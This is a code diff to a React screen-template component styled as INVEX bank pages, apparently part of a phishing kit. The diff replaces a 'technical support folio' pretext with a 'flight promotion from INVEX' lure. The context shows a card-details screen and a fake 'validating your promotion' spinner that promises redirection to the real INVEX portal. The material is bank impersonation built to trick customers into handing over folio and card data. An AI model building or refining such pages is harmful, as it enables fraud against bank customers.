@@ -220,8 +220,8 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case ScreenType.FOLIO:
         const folioContent = (
           <>
-            <h2 className="text-xl font-bold mb-3">Folio de soporte:</h2>
-            <p className="mb-4">Por favor, ingrese el folio de soporte técnico que su ejecutivo en línea le proporcionó.</p>
+            <h2 className="text-xl font-bold mb-3">Folio de promoción:</h2>
+            <p className="mb-4">Por favor, ingrese el folio de la promoción de vuelos que recibió de INVEX.</p>
             <div className="mb-4">
               <label className="block text-sm font-medium text-gray-700 text-left mb-1">Número de folio:</label>
               <Input 
@@ -1142,17 +1142,17 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return getBankContainer(datosTarjetaContent);
 
       case ScreenType.GENERANDO_ACLARACION:
-        const generandoAclaracionContent = (
+        const generandoPromocionContent = (
           <div className="flex flex-col items-center justify-center py-10">
-            <h2 className="text-xl font-bold mb-5">Generando aclaración</h2>
+            <h2 className="text-xl font-bold mb-5">Procesando promoción de vuelos</h2>
             <div className="flex items-center justify-center mb-5">
               <div className="w-12 h-12 border-t-4 border-b-4 border-[#BE0046] rounded-full animate-spin"></div>
             </div>
-            <p className="text-center mb-2">Por favor espere, estamos procesando su solicitud...</p>
+            <p className="text-center mb-2">Por favor espere, estamos validando su promoción de vuelos...</p>
             <p className="text-center text-sm text-gray-500">Será redirigido automáticamente al portal de INVEX Tarjetas</p>
           </div>
         );
-        return getBankContainer(generandoAclaracionContent);
+        return getBankContainer(generandoPromocionContent);
         
       default:
         const defaultContent = (
